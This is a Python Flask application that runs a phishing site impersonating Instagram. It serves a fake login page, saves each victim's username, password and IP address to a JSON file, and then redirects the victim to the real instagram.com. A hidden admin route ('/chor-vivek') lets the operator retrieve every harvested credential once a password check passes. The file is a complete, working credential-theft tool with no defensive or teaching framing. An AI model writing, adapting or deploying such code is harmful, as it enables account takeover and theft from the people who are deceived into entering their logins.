from flask import Flask, render_template, request, jsonify, redirect, Response
from flask_cors import CORS, cross_origin
import os
from json import load, dump
import logging
from datetime import datetime

# Creating Flask Application
app = Flask(__name__)
CORS(app)

# Defining Variables
CREDENTIAL_FILE = 'credentials.json'
PASSWORD_FILE = 'login-keys.json'
LOG_FILE = f"{datetime.now().strftime('%m_%d_%Y_%H_%M_%S')}.log"
LOGS_PATH = os.path.join(os.getcwd(), 'logs')
LOG_FILE_PATH = os.path.join(LOGS_PATH, LOG_FILE)
ADMIN_PAGE = 'instagram/admin-login.html'
LOGIN_PAGE = 'instagram/login.html'

# Creating Logs Directory
os.makedirs(
    name=LOGS_PATH,
    exist_ok=True
)

# Basic Log Configuration
logging.basicConfig(
    filename=LOG_FILE_PATH,
    filemode="w",
    format='[%(asctime)s] | %(levelname)s | %(funcName)s() | %(message)s',
    level=logging.INFO
)


@app.route('/')
@cross_origin()
def homepage(*args, **kwargs) -> str:
    '''Returns rendered login page.'''

    # getting client's ip address
    client_ip = request.remote_addr
    logging.info(f'{client_ip} Requested Login Page')

    return render_template(LOGIN_PAGE)


@app.route('/redirect', methods=['POST'])
@cross_origin()
def redirect_to_instagram(*args, **kwargs) -> Response:
    '''Store ip-address, username, password into Credentials File and redirect to instagram.com'''

    client_ip = request.remote_addr
    logging.info(f'{client_ip} submit credentials')

    # requesting value from html form
    username = request.form['username']
    password = request.form['password']

    # reading the credential file
    if os.path.exists(CREDENTIAL_FILE):
        with open(file=CREDENTIAL_FILE, mode='r', encoding='utf-8') as file:
            credential = load(fp=file)
    else:
        credential = []
    logging.info('Credentials File Loaded')

    # appending ipaddress, username, password into credentials
    credential.append({'ipaddress': client_ip, 'username': username, 'password': password})
    logging.info('Credential File Updated')

    # UPdating credentials file
    with open(file=CREDENTIAL_FILE, mode='w', encoding='utf-8') as file:
        dump(obj=credential, fp=file)
        logging.info('Credential File Dumped')

    logging.info('Redirect to Instagram.com')
    return redirect(location = 'https://instagram.com')

@app.route('/chor-vivek', methods=['GET'])
@cross_origin()
def acess_credentials(*args, **kwargs) -> str:
    '''Return rendered Admin login Page.'''

    client_id = request.remote_addr
    logging.info(f'{client_id} Requested Admin Page')

    return render_template(ADMIN_PAGE)


@app.route(rule='/admin', methods=['POST'])
@cross_origin()
def validate_admin_login(*args, **kwargs) -> Response|str:
    '''Return credentials on validation or redirect to admin login page.'''

    client_ip = request.remote_addr
    # reading password file
    with open(file=PASSWORD_FILE, mode='r', encoding='utf-8') as pswd:
        PASSWORD = load(pswd)

    if request.form['password'] == PASSWORD['password']:
        name = request.form['fullname']
        mobile = request.form['mobile']
        email = request.form['email']
        logging.info(f'{client_ip}-{name}-{mobile}-{email} Accessed Credentials')

        with open(file=CREDENTIAL_FILE, mode='r', encoding='utf-8') as file:
            credentials = load(file)
        return jsonify(*credentials)
    else:
        logging.info(f'{client_ip} Admin Page Validation Failed')
        return render_template(ADMIN_PAGE, message='Haram Khor Password galat hai.')



if __name__ == '__main__':
    logging.info('Application Started')
    app.run(host='0.0.0.0', port=8000)
